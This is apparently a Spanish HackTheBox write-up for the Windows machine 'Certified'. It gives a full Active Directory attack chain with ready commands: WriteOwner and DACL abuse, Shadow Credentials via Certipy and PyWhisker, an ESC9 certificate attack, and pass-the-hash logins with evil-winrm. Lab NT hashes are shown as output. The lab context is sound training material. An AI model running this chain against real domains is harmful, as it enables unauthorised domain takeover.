+++ 
draft = false
date = 2026-05-23T02:59:04Z
title = "Certified Machine - HackTheBox"
description = ""
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

-------------------------
- Tags: #Machine #Windows #Medium #ADCS
----------------

# Introducción

Este writeup documenta la resolución de la máquina Windows **Certified** en HackTheBox. El entorno simula una brecha asumida en Active Directory, partiendo con credenciales válidas de un usuario de bajo privilegio.

El ataque se centra en la enumeración y abuso de ACLs en Active Directory. El usuario inicial dispone de permisos **WriteOwner** sobre un grupo administrativo, lo que permite tomar control del objeto y escalar privilegios mediante delegaciones encadenadas hasta comprometer cuentas de servicio. Mediante la toma de propiedad del objeto y el abuso de estas delegaciones, se compromete una cuenta de servicio mediante ataques de _Shadow Credentials_.

Finalmente, se explota una mala configuración en **Active Directory Certificate Services (ADCS)**. Mediante una cadena de delegaciones y el abuso de una plantilla vulnerable, se logra emitir un certificado con la identidad del usuario Administrador, obteniendo control total del dominio.

# Información previa

Como es común en pentests reales de Windows, comenzarás la máquina **Certified** con credenciales para la siguiente cuenta: 

Usuario: ``judith.mader``  
Contraseña: ``judith09``.
# Enumeración Nmap

El escaneo de puertos revela servicios típicos de un entorno Windows con Active Directory, incluyendo DNS, Kerberos, LDAP y SMB.

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.231.186 -oG allPorts
```

<img src="/images/Pasted image 20260522164731.png" style="width:100%; height:auto; display:block; margin:auto;">

Escaneando los servicios y las versiones que corren en los puertos encontrados anteriormente, se obtienen los siguientes resultados

```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49693,49694,49695,49724,49733 -sCV 10.129.231.186 -oN portServices
```

En el resultado del escaneo, podemos ver el nombre de dominio `certified.htb`

<img src="/images/Pasted image 20260522165538.png" style="width:100%; height:auto; display:block; margin:auto;">

Procederemos a agregarlo a nuestro `/etc/hosts`

<img src="/images/Pasted image 20260522165859.png" style="width:100%; height:auto; display:block; margin:auto;">

# Enumeración SMB

Primeramente probamos las credenciales proporcionadas inicialmente, para confirmar que estas sean válidas

```bash
netexec smb certified.htb -u 'judith.mader' -p 'judith09'
```

y tenemos como resultado que el dominio acepta las credenciales

<img src="/images/Pasted image 20260522170221.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora revisamos si nuestro usuario tiene acceso a algún recurso compartido por `SMB`.

```bash
netexec smb certified.htb -u 'judith.mader' -p 'judith09' --shares
```

El usuario posee acceso de lectura a los compartidos por defecto del dominio (**IPC$, NETLOGON y SYSVOL**), sin evidencia de datos sensibles en esta etapa.

<img src="/images/Pasted image 20260522170247.png" style="width:100%; height:auto; display:block; margin:auto;">

Dentro de estos directorios no encontramos nada interesante.

# Enumeración LDAP

Como tenemos credenciales válidas, haremos una enumeración de usuarios con `ldapsearch`, de la siguiente forma

```bash
ldapsearch -x -H ldap://10.129.231.186 -D 'certified\judith.mader' -w 'judith09' -b "DC=certified,DC=htb" | grep "userPrincipalName"
```

La enumeración LDAP permite identificar múltiples cuentas de usuario dentro del dominio.

<img src="/images/Pasted image 20260522170427.png" style="width:100%; height:auto; display:block; margin:auto;">

Se filtran los valores de `userPrincipalName` para construir una lista de usuarios del dominio.

```bash
ldapsearch -x -H ldap://10.129.231.186 -D 'certified\judith.mader' -w 'judith09' -b "DC=certified,DC=htb" | grep "userPrincipalName" | awk '{print $2}' | cut -d '@' -f1 >> users
```

Teniendo como resultado lo siguiente

<img src="/images/Pasted image 20260522170506.png" style="width:100%; height:auto; display:block; margin:auto;">

# Enumeración de Active Directory

Para realizar una enumeración del dominio más exhaustiva, y con el objetivo de mapear relaciones de delegación y posibles rutas de escalación de privilegios. utilizaremos la herramienta `bloodhound`

## Recolectar datos .zip

Como tenemos credenciales de un usuario válido en el dominio, utilizaremos `bloodhound-python`, para recolectar información en un zip, de la siguiente manera

```bash
bloodhound-python -u 'judith.mader' -p 'judith09' -d certified.htb -ns 10.129.231.186 -c All --zip
```

La recolección inicial falla debido a discrepancias de tiempo entre el atacante y el controlador de dominio.

<img src="/images/Pasted image 20260522170808.png" style="width:100%; height:auto; display:block; margin:auto;">

Para solucionar esto utilizaremos `faketime` y  `ntpdate` de la siguiente forma

```bash
faketime "$(ntpdate -q 10.129.231.186 | cut -d ' ' -f 1,2)" bloodhound-python -u 'judith.mader' -p 'judith09' -d certified.htb -ns 10.129.231.186 -c All --zip
```

Así obtenemos nuestro archivo `.zip` que deberemos cargar en `Bloodhound`

<img src="/images/Pasted image 20260522171959.png" style="width:100%; height:auto; display:block; margin:auto;">

## Preparar docker con Bloodhound

Para crear nuestro contenedor con `Bloodhound` descargaremos el `docker-compose` desde la siguiente página web https://0ut3r.space/2024/04/22/bloodhound-ce-and-docker/

Basta con realizar el siguiente comando para descargarlo

```bash
wget https://raw.githubusercontent.com/SpecterOps/bloodhound/main/examples/docker-compose/docker-compose.yml
```

Una vez descargada deberemos iniciar el contenedor con el siguiente comando

```bash
docker-compose up -d
```

Posteriormente accedemos desde nuestro navegador a `localhost:8080` y se nos abrirá la interaz de `Bloodhound`

<img src="/images/Pasted image 20260306232542.png" style="width:100%; height:auto; display:block; margin:auto;">

En el apartado de correo pondremos `admin`, y para obtener la contraseña habrá que leer los logs de nuestro contenedor con el siguiente comando

```bash
docker-compose logs
```

<img src="/images/Pasted image 20260522172320.png" style="width:100%; height:auto; display:block; margin:auto;">

En este apartado deberemos subir el `.zip` que obtuvimos anteriormente

<img src="/images/Pasted image 20260306232728.png" style="width:100%; height:auto; display:block; margin:auto;">

y luego vamos a `Administration`, y esperamos hasta que aparezca `Complete`

<img src="/images/Pasted image 20260306232824.png" style="width:100%; height:auto; display:block; margin:auto;">

# Análisis de AD con BloodHound

Como bien sabemos, tenemos las credenciales del usuario `judith.mader` por tanto veremos las propiedades y los permisos que tiene este usuario

Vemos que `judith.mader` tiene permisos `WriteOwner` sobre el grupo `MANAGEMENT`, lo que permite cambiar el propietario (owner) de un objeto, en este caso el grupo `MANAGEMENT`.

<img src="/images/Pasted image 20260522175842.png" style="width:100%; height:auto; display:block; margin:auto;">

-----

Lo que haremos inicialmente será tomar propiedad del grupo `MANAGEMENT` aprovechando el permiso `WriteOwner` que posee `judith.mader`. Para ello cambiaremos el propietario del objeto y asignaremos a `judith.mader` como nueva dueña del grupo `MANAGEMENT`.

```bash
impacket-owneredit -action write -new-owner 'judith.mader' -target 'MANAGEMENT' 'certified.htb'/'judith.mader':'judith09'
```

<img src="/images/Pasted image 20260522185138.png" style="width:100%; height:auto; display:block; margin:auto;">

Para modificar los miembros del grupo `MANAGEMENT`, debemos modificar la DACL del grupo, y otorgarle `WriteMembers` a `judith.mader`.

Para ello primero necesitamos obtener el Distinguished Name (DN) del grupo, para ello utilizaremos el siguiente comando

```bash
ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w 'judith09' -b "DC=certified,DC=htb" "(cn=MANAGEMENT)"
```

Obteniendo lo siguiente `dn: CN=Management,CN=Users,DC=certified,DC=htb`

<img src="/images/Pasted image 20260522185920.png" style="width:100%; height:auto; display:block; margin:auto;">

Procedemos a  modificar la DACL del grupo, y otorgarle `WriteMembers` a `judith.mader`.

```bash
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=Management,CN=Users,DC=certified,DC=htb' 'certified.htb'/'judith.mader':'judith09'
```

<img src="/images/Pasted image 20260522190043.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora podemos agregar al usuario `judith.mader` al grupo `MANAGEMENT`, de la siguiente forma

```bash
net rpc group addmem "MANAGEMENT" "judith.mader" -U "CERTIFIED"/"judith.mader"%"judith09" -S 10.129.231.186
```

y una vez realizado el comando, podemos verificarlo con este

```bash
net rpc group members "MANAGEMENT" -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
```

Viendo que nuestro usuario se ha agregado al grupo correctamente

<img src="/images/Pasted image 20260522190547.png" style="width:100%; height:auto; display:block; margin:auto;">

Si vemos el `Outbound Object control` del grupo `MANAGEMENT`, vemos que este grupo tiene permisos `GenericWrite` sobre el usuario `MANAGEMENT_SVC`

<img src="/images/Pasted image 20260522190748.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora debemos explotar `Shadow Credentials`, Podemos utilizar `Certipy` o `PyWhisker`.

A continuación se explicará como realizarlo con ambas herramientas.

## Shadow Credentials con Certipy

**NOTA:** Debido a un reinicio del entorno, la IP inicial cambió a `10.129.1.220`.

Para obtener el `HASH NT` de `MANAGEMENT_SVC` con `Certipy` podemos utilizar el siguiente comando

```bash
faketime "$(ntpdate -q 10.129.1.220 | cut -d ' ' -f 1,2)" certipy-ad shadow auto -u 'judith.mader@certified.htb' -p 'judith09' -account 'management_svc' -dc-ip 10.129.1.220 -dc-host certified.htb
```

<img src="/images/Pasted image 20260522195330.png" style="width:100%; height:auto; display:block; margin:auto;">

Obteniendo el siguiente HASH NT

```bash
a091c1832bcdd4677c28b5a6a1295584
```

-----------

## Shadow Credentials con PyWhisker

Análogamente, podemos utilizar `PyWhisker` para realizar el `Shadow Credentials` de forma más manual, y poder obtener el HASH NT del usuario `MANAGEMENT_SVC`

### Instalando PyWhisker

Para instalar `pyWhisker` primeramente nos clonamos el repositorio completo

```bash
git clone https://github.com/ShutdownRepo/pywhisker.git
cd pywhisker
```

Posteriormente activamos el entorno virtual de `Python`

```bash
python3 -m venv .venv
source .venv/bin/activate
```

Actualizamos pip

```bash
pip install --upgrade pip
```

Instalamos todas las dependencias

```bash
pip install -r requirements.txt
```

y finalmente instalamos `PyWhisker`

```bash
pip install .
```

### Obtener HASH NT con PyWhisker

Una vez dentro del grupo `MANAGEMENT`, abusamos de la ACL `GenericWrite` para obtener control sobre la cuenta `management_svc` agregando Shadow Credentials. Para ello utilizamos `pyWhisker`.

```bash
python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
```

<img src="/images/Pasted image 20260522200228.png" style="width:100%; height:auto; display:block; margin:auto;">

Esto nos proporcionará un certificado PFX, el cual utilizaremos para autenticarnos como el usuario `management_svc`.  
Usando este certificado, obtenemos un TGT para dicho usuario mediante `PKINITtools`.

```bash
faketime "$(ntpdate -q 10.129.1.220 | cut -d ' ' -f 1,2)" python3 ../../PKINITtools/gettgtpkinit.py -cert-pfx 4Gz16c4z.pfx certified.htb/management_svc -pfx-pass 'ijOEvJpAhhjXvY1kKIJc' management_svc.ccache
```

<img src="/images/Pasted image 20260522201150.png" style="width:100%; height:auto; display:block; margin:auto;">

Se genera un TGT de Kerberos asociado al usuario comprometido, el cual se exporta para su uso posterior. A partir de este ticket, se utiliza `getnthash.py` del mismo toolkit para obtener el hash NTLM del usuario `management_svc`.

```bash
export KRB5CCNAME=management_svc.ccache
```

```bash
faketime "$(ntpdate -q 10.129.1.220 | cut -d ' ' -f 1,2)" python3 ../../PKINITtools/getnthash.py -key 1ac56a8011abb27a301823e8e850f0e912e16845d8f5637e78fd6359eda2eb5f  certified.htb/management_svc
```

Finalmente obtenemos el HASH NT `a091c1832bcdd4677c28b5a6a1295584` de `MANAGEMENT_SVC`

<img src="/images/Pasted image 20260522201429.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora podemos utilizar este hash para autenticarnos con `evil-winrm`, de la siguiente forma

```bash
evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```

y vemos que nos conectamos exitosamente

<img src="/images/Pasted image 20260522195536.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora podemos encontrar y leer la flag de `user.txt`

<img src="/images/Pasted image 20260522195614.png" style="width:100%; height:auto; display:block; margin:auto;">

# Movimiento Lateral

Como ahora tenemos acceso al usuario `MANAGEMENT_SVC`, podemos enumerar los privilegios y relaciones que posee dentro del dominio para identificar posibles vectores de escalación.

Vemos que la cuenta comprometida `MANAGEMENT_SVC`, a la cual tenemos acceso mediante su hash NTLM, posee permisos `GenericAll` sobre el usuario `CA_OPERATOR`, lo que nos otorga control total sobre dicho objeto y permite realizar acciones como restablecer su contraseña o modificar sus atributos.

<img src="/images/Pasted image 20260522210900.png" style="width:100%; height:auto; display:block; margin:auto;">

Por lo cual podemos obtener el `HASH NT` de `CA_OPERATOR`, de la misma forma que hicimos con `MANAGEMENT_SVC`, pero ahora usando el `HASH`

```bash
faketime "$(ntpdate -q 10.129.1.220 | cut -d ' ' -f 1,2)" certipy-ad shadow auto -u 'management_svc@certified.htb' -hashes ':a091c1832bcdd4677c28b5a6a1295584' -account 'ca_operator' -dc-ip 10.129.1.220 -dc-host certified.htb
```

Obteniendo el hash de `ca_operator : 0ef3298edfc59e0cd07c56d829eea9c6`

<img src="/images/Pasted image 20260522214508.png" style="width:100%; height:auto; display:block; margin:auto;">

# Escalada de privilegios

Se realiza una enumeración del servicio ADCS (Active Directory Certificate Services) para verificar si está presente en el dominio y detectar posibles configuraciones o plantillas vulnerables que puedan ser explotadas.

```bash
certipy-ad find -u ca_operator@certified.htb -hashes ':0ef3298edfc59e0cd07c56d829eea9c6' -dc-ip 10.129.1.220
```

Se confirma la presencia del servicio ADCS (Active Directory Certificate Services) dentro del dominio, lo que indica la existencia de una infraestructura de emisión de certificados.

<img src="/images/Pasted image 20260522220254.png" style="width:100%; height:auto; display:block; margin:auto;">

A partir de esto, se procede a enumerar las plantillas de certificados disponibles con el objetivo de identificar configuraciones inseguras o vulnerabilidades que puedan ser explotadas para escalar privilegios dentro del entorno.

```bash
certipy-ad find -u ca_operator@certified.htb -hashes ':0ef3298edfc59e0cd07c56d829eea9c6' -dc-ip 10.129.1.220 -vulnerable -stdout
```

Se identifica una condición compatible con **ESC9**, donde la validación entre la identidad del usuario y el certificado no se aplica correctamente, permitiendo la suplantación mediante manipulación del `userPrincipalName`.

Este escenario habilita un vector de ataque basado en certificados dentro de ADCS, aprovechable para escalamiento de privilegios en el dominio.

El ataque consiste en modificar temporalmente el `userPrincipalName` del usuario objetivo para que coincida con la identidad del Administrador.

Para ello utilizaremos el siguiente comando

```bash
certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator@certified.htb
```

Teniendo como resultado que el cambio fue exitoso

<img src="/images/Pasted image 20260522220810.png" style="width:100%; height:auto; display:block; margin:auto;">

Una vez modificado temporalmente el `UPN` del usuario `CA_OPERATOR`, se solicita un certificado utilizando la plantilla vulnerable.

```bash
certipy-ad req -username ca_operator@certified.htb -hashes 0ef3298edfc59e0cd07c56d829eea9c6 -ca certified-DC01-CA -template CertifiedAuthentication
```

Si la modificación es efectiva, la CA emite un certificado asociado a la identidad del Administrador del dominio.

<img src="/images/Pasted image 20260522221557.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora modificamos nuevamente el `UPN` de `CA_OPERATOR` al que tenía inicialmente, con el siguiente comando

```bash
certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
```

Viendo que el cambio fue exitoso

<img src="/images/Pasted image 20260522221826.png" style="width:100%; height:auto; display:block; margin:auto;">

Finalmente, se utiliza el archivo `.pfx` obtenido para autenticarse como el usuario `Administrator` mediante ``Certipy``

```bash
faketime "$(ntpdate -q 10.129.1.220 | cut -d ' ' -f 1,2)" certipy-ad auth -pfx administrator.pfx -username Administrator -domain certified.htb -dc-ip 10.129.1.220
```

Obteniendo el hash NTLM del usuario `administrator : 0d5b49608bbce1751f708748f67e2d34`

<img src="/images/Pasted image 20260522222143.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora podemos autenticarnos con `evilwinrm` como `administrator`, de la siguiente forma

```bash
evil-winrm -i certified.htb -u Administrator -H 0d5b49608bbce1751f708748f67e2d34
```

y entramos exitosamente como el usuario `administrator`

<img src="/images/Pasted image 20260522222320.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora podemos leer la `root.txt`, y finalmente comprometimos totalmente la máquina víctima y el DC

<img src="/images/Pasted image 20260522222408.png" style="width:100%; height:auto; display:block; margin:auto;">

# Conclusión

La explotación de Certified se basa en una cadena de abusos en Active Directory: delegaciones mal configuradas en ACLs, abuso de Shadow Credentials para comprometer cuentas de servicio y explotación de ADCS mediante ESC9. La combinación de estos vectores permite la toma completa del dominio desde un acceso inicial de bajo privilegio.
